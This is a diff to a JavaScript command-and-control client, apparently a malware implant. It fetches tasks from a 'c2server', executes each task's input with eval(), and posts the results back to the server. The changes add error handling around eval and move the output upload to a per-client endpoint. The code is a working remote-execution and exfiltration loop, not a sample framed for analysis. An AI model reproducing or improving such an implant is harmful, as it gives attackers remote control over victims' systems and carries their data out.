@@ -28,7 +28,13 @@ function run() {
                 var jsondata = JSON.parse(getTaskRequest.responseText);
                 for (var i in jsondata.tasks) {
                     console.debug("[*] got task " + jsondata.tasks[i].id + ": " + jsondata.tasks[i].input)
-                    var cmdout = eval(jsondata.tasks[i].input); //do the task
+                    try{
+                        var cmdout = eval(jsondata.tasks[i].input); //do the task
+                    }
+                    catch(err){
+                        var cmdout = err;
+                    }
+                    
                     console.debug(cmdout); //log output locally
                     var taskCompleteRequest = new XMLHttpRequest();
                     taskCompleteRequest.onreadystatechange = function () {
@@ -36,9 +42,11 @@ function run() {
                             console.debug("[*] task complete: " + jsondata.tasks[i].id)
                         }
                     };
-                    taskCompleteRequest.open("POST", c2server + "/api/tasks/"+jsondata.tasks[i].id, true);
+                    taskCompleteRequest.open("POST", c2server + "/api/client/"+String(clientid)+"/task/"+jsondata.tasks[i].id+"/output", true);
                     taskCompleteRequest.setRequestHeader("Content-type","application/json");
-                    taskCompleteRequest.send('{"tasks":[{"output":"'+String(cmdout)+'"}]}'); //log output remotely
+                    var taskoutput = {tasks:[{output:String(cmdout)}]}
+                    var outputjson = JSON.stringify(taskoutput);
+                    taskCompleteRequest.send(outputjson); //log output remotely
 
                 }
 
